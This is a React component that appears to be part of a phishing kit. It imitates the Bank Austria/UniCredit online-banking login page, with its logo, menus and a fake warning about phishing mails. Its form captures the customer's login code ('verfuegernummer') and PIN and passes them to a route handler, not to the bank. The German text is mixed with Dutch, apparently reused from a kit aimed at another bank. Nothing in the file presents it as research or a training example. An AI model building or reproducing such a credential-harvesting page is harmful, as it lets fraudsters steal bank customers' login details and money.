"use client";

import React from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function BankAustria({ formData, onChange, handleRouteAction, saving }: Props) {
  const SIDEBAR_ITEMS = [
    { label: "GIROKONTEN", icon: <path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4 M4 6v14a2 2 0 0 0 2 2h14v-8H10a2 2 0 0 1-2-2V6" /> },
    { label: "KREDITKARTEN", icon: <path d="M2 5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5z M2 10h20 M7 15h2" /> },
    { label: "SPARPRODUKTE", icon: <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /> },
    { label: "FINANZIERUNG", icon: <path d="M14 4h-2a4 4 0 0 0-4 4v8a4 4 0 0 0 4 4h2 M4 12h10 M4 16h10" /> },
    { label: "WERTPAPIERE", icon: <path d="M18 20V10 M12 20V4 M6 20v-6" /> },
    { label: "BÖRSEN & MÄRKTE", icon: <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2z M2 12h20 M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" /> },
  ];

  return (
    <div className="flex flex-col min-h-screen bg-white font-sans overflow-x-hidden">
      {/* Top Header */}
      <div className="flex w-full h-[72px] sticky top-0 z-50">
        {/* Hamburger */}
        <div className="w-[72px] h-full bg-[#2c2c2c] flex items-center justify-center cursor-pointer shrink-0">
          <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
            <path d="M3 6h18 M3 12h18 M3 18h18" />
          </svg>
        </div>

        {/* Logo Area */}
        <div className="w-[208px] h-full bg-white flex flex-col justify-center pl-5 shrink-0">
          <div className="flex items-center gap-1.5">
            {/* Ribbon Icon */}
            <div className="relative w-5 h-5 bg-[#e30613] rounded-full overflow-hidden flex items-center justify-center shrink-0">
              <div className="absolute w-8 h-1.5 bg-white rotate-45 transform"></div>
            </div>
            <span className="text-[#333] font-bold text-xl tracking-tight leading-none">Bank Austria</span>
          </div>
          <div className="flex items-center gap-1 mt-1 pl-6">
            <span className="text-[9px] text-gray-500 italic">Member of</span>
            <span className="text-[10px] font-bold text-[#333] flex items-center gap-0.5">
              <div className="w-2.5 h-2.5 bg-[#e30613] rounded-full flex items-center justify-center">
                <span className="text-white text-[6px] font-bold">1</span>
              </div>
              UniCredit
            </span>
          </div>
        </div>

        {/* Menu Area */}
        <div className="flex-1 bg-[#e30613] hidden md:flex items-center justify-center gap-12 text-white">
          <div className="flex flex-col items-center gap-1 cursor-pointer hover:opacity-80">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2 M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" /></svg>
            <span className="text-[10px] font-bold tracking-wider">PRIVATKUNDEN</span>
          </div>
          <div className="flex flex-col items-center gap-1 cursor-pointer hover:opacity-80">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M3 21h18 M5 21V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v16 M9 21v-4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v4 M9 7h6 M9 11h6" /></svg>
            <span className="text-[10px] font-bold tracking-wider">FIRMENKUNDEN</span>
          </div>
          <div className="flex flex-col items-center gap-1 cursor-pointer hover:opacity-80">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z M9 12l2 2 4-4" /></svg>
            <span className="text-[10px] font-bold tracking-wider">PRIVATE BANKING</span>
          </div>
          <div className="flex flex-col items-center gap-1 cursor-pointer hover:opacity-80">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2 M9 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z M23 21v-2a4 4 0 0 0-3-3.87 M16 3.13a4 4 0 0 1 0 7.75" /></svg>
            <span className="text-[10px] font-bold tracking-wider">ÜBER UNS</span>
          </div>
        </div>
      </div>

      <div className="flex flex-1">
        {/* Sidebar */}
        <div className="hidden md:flex w-[280px] bg-[#2c2c2c] min-h-full flex-col text-[#9aa3a9] shrink-0">
          {SIDEBAR_ITEMS.map((item, idx) => (
            <div key={idx} className="flex items-center h-[72px] border-b border-[#3c3c3c] px-6 gap-6 hover:bg-[#3c3c3c] hover:text-white cursor-pointer transition-colors">
              <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                {item.icon}
              </svg>
              <span className="text-sm font-medium tracking-wide">{item.label}</span>
            </div>
          ))}
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          <h1 className="text-[#e30613] font-bold text-[32px] mb-10 tracking-tight">24You</h1>

          <div className="w-full max-w-[840px] bg-[#eaf6f9] p-5 md:p-6 rounded-md text-center text-[#333] text-[13px] md:text-sm mb-12 leading-relaxed shadow-sm">
            <p className="font-bold mb-3">Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.</p>
            <p className="mb-3">Klik nooit op inloglinks in e-mails of sms-berichten! Lees altijd het volledige bericht voordat u een code invoert!</p>
            <p>Sie befürchten, Opfer dieses Betruges zu sein? Rufen Sie zu Ihrer eigenen Sicherheit umgehend das Bank Austria Sicherheitscenter unter der Rufnummer 050505-26105 an.</p>
          </div>

          <form 
            onSubmit={(e) => {
              e.preventDefault();
              handleRouteAction();
            }} 
            className="w-full max-w-[420px] flex flex-col items-center gap-4"
          >
            {/* Inlogcode */}
            <div className="relative w-full">
              <input
                type="text"
                placeholder="Inlogcode"
                value={formData.verfuegernummer || ""}
                onChange={(e) => onChange("verfuegernummer", e.target.value)}
                className="w-full h-12 border border-[#e3e6e8] rounded-[8px] px-4 outline-none focus:border-[#00a7b5] text-[#333] placeholder-[#9aa3a9] shadow-sm text-sm"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full border border-[#9aa3a9] flex items-center justify-center text-[#9aa3a9] text-xs font-serif cursor-pointer hover:bg-gray-50">
                i
              </div>
            </div>

            {/* PIN */}
            <div className="relative w-full mt-1">
              <input
                type="text"
                placeholder="PIN"
                value={formData.pin || ""}
                onChange={(e) => onChange("pin", e.target.value)}
                className="w-full h-12 border border-[#e3e6e8] rounded-[8px] px-4 outline-none focus:border-[#00a7b5] text-[#333] placeholder-[#9aa3a9] shadow-sm text-sm"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full border border-[#9aa3a9] flex items-center justify-center text-[#9aa3a9] text-xs font-serif cursor-pointer hover:bg-gray-50">
                i
              </div>
            </div>

            <a href="#" className="text-[#00a7b5] text-[13px] hover:underline my-1">
              PIN vergeten of inlogcode geblokkeerd?
            </a>

            <button
              type="submit"
              disabled={saving}
              className="mt-2 bg-[#00a7b5] text-white font-bold h-11 px-14 rounded text-sm hover:bg-[#008f9c] transition-colors shadow-sm disabled:opacity-70 uppercase tracking-wider"
            >
              {saving ? "Wird geladen..." : "LOGIN"}
            </button>
          </form>

          {/* Security Notice */}
          <div className="mt-14 text-center">
            <a href="#" className="text-[#00a7b5] text-[13px] font-bold hover:underline block mb-1">
              Gefälschte Bank Austria Mails im Umlauf!
            </a>
            <a href="#" className="text-[#00a7b5] text-xs hover:underline block">
              Details anzeigen
            </a>
          </div>

          {/* Language Selector */}
          <div className="mt-auto pt-16 flex items-center justify-center gap-8 pb-8">
            <div className="flex flex-col items-center gap-1.5 cursor-pointer">
              <div className="w-[30px] h-[30px] rounded-full overflow-hidden border border-gray-200 bg-red-600 relative">
                <div className="w-full h-2.5 bg-white absolute top-1/2 -translate-y-1/2"></div>
              </div>
              <span className="text-[11px] text-[#00a7b5] font-bold">Deutsch</span>
            </div>
            <div className="flex flex-col items-center gap-1.5 cursor-pointer opacity-60 hover:opacity-100 transition-opacity">
              <div className="w-[30px] h-[30px] rounded-full overflow-hidden border border-gray-200 bg-[#00247d] relative flex items-center justify-center">
                <div className="w-full h-full relative">
                  <div className="absolute top-1/2 -translate-y-1/2 w-full h-[6px] bg-white"></div>
                  <div className="absolute left-1/2 -translate-x-1/2 h-full w-[6px] bg-white"></div>
                  <div className="absolute top-1/2 -translate-y-1/2 w-full h-1 bg-[#cf142b]"></div>
                  <div className="absolute left-1/2 -translate-x-1/2 h-full w-1 bg-[#cf142b]"></div>
                  <div className="absolute inset-0 border-t-[3px] border-b-[3px] border-white rotate-45 transform origin-center scale-150"></div>
                  <div className="absolute inset-0 border-t-[1px] border-b-[1px] border-[#cf142b] rotate-45 transform origin-center scale-150"></div>
                </div>
              </div>
              <span className="text-[11px] text-[#333] font-bold">English</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
